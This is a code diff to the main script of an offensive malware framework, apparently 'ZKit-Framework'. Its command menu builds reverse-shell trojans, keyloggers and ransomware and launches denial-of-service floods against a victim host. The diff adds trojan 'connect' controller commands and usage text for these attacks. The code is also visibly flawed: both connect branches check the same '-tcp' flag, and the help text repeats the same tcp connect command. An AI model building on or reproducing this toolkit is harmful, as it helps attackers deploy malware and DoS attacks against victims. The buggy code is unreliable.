@@ -1,5 +1,6 @@
 'ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework'
 
+from sys import platform
 __all__ = ["why_do_you_want_to_import_this"]
 
 
@@ -11,12 +12,11 @@ def why_do_you_want_to_import_this():
 __author__ = 'Zer0'
 # Created A New Header
 __github__ = 'https://github.com/000Zer000/ZKit-Framework'
-#
-__version__ = 'WPR_0.9.1'
+__version__ = '1.0.0'
 __license__ = 'Apache License 2.0'
 __status__ = 'Developing'
 
-if __name__ == "__main__" :
+if __name__ == "__main__":
     try:
         from os import path
         from time import sleep as Sleep
@@ -35,8 +35,8 @@ if __name__ == "__main__" :
     K_PATH = PATH + "/Builded/KeyLogger/"
     R_PATH = PATH + "/Builded/Ransomware/"
     init(convert=True)
+    errors = list('Errors')
     print(Fore.LIGHTGREEN_EX + Banners.Banner1 + Fore.RESET)
-
     Sleep(1)
     while True:
 
@@ -60,6 +60,15 @@ if __name__ == "__main__" :
                     ZKit_Core.Trojans.Reverse_Shell_UDP.Create(
                         Host=Choice[6], Port=Choice[8], str1=str1, str2=str2,
                         str3=str3, str4=str4, PATH=file_name)
+                elif Choice[2] == 'connect':
+
+                    if Choice[3] == '-tcp':
+                        import ZKit_Core.Trojans.TCP_Connect
+                        ZKit_Core.Trojans.TCP_Connect.Connect()
+                    if Choice[3] == '-tcp':
+                        import ZKit_Core.Trojans.UDP_Connect
+                        ZKit_Core.Trojans.UDP_Connect.Connect()
+
 
             elif Choice[0] == 'dos' and (
                     Choice[1] == 'ss' and Choice[3] == '-s' and Choice[5] == '-v'):
@@ -91,15 +100,37 @@ if __name__ == "__main__" :
                         a6=strs[5], a7=strs[6], a8=strs[7], a9=strs[8],
                         a10=strs[9], a11=strs[10], a12=strs[11],
                         a13=strs[12], a14=strs[13], PATH=file_name)
+            elif Choice[0] == 'debug' :
+                print(errors)
+
             elif CHOICES == 'help':
                 print(''' *Case sensetive*
-trojan -m UDP_OR_TCP -f FILENAME -h HOST_OR_IP -p PORT 
+# Trojans
+trojan -m tcp -f FILENAME -h IP -p PORT 
+trojan -m tcp -f FILENAME -h HOST -p PORT 
+
+trojan -m udp -f FILENAME -h HOST -p PORT 
+trojan -m udp -f FILENAME -h IP -p PORT 
+
+# Trojan controllers
+trojan -m connect -tcp 
+trojan -m connect -tcp
+# Dos Attackers
 dos -m ss -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORT -m MESSAGE -c COUNT 
 dos -m sm -s SOURCE_IP_OR_HOST SOURCE_PORT -v VICTIM_IP_OR_HOST VICTIM_PORTS -m MESSAGE -c COUNT 
-keylogger -m UDP_OR_TCP -f FILENAME -h HOST_OR_IP -p PORT
+# KeyLogger
+keylogger -m tcp -f FILENAME -h IP -p PORT
+keylogger -m tcp -f FILENAME -h HOST -p PORT
+
+keylogger -m udp -f FILENAME -h HOST -p PORT
+keylogger -m udp -f FILENAME -h IP -p PORT
+
+
                 ''')
             else:
                 print("{} Is Not A Valid Input\n".format(CHOICES))
-        except IndexError:
-            print('Invalid Input type help to see available commands')
-
+                
+        except Exception as value:
+            value = str(value)
+            print("Invalid Input Or Not enough Arguments type 'help' to see available commands type . 'debug' to see python exception value(s)")
+            errors.append(value)
